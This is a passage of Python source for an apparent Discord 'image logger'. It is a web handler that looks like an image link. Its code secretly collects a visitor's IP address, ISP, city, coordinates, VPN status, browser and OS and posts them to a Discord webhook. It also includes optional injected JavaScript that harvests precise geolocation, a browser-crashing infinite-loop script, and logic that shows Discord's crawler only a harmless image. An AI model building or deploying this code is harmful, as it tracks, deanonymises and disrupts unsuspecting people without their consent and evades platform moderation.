> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
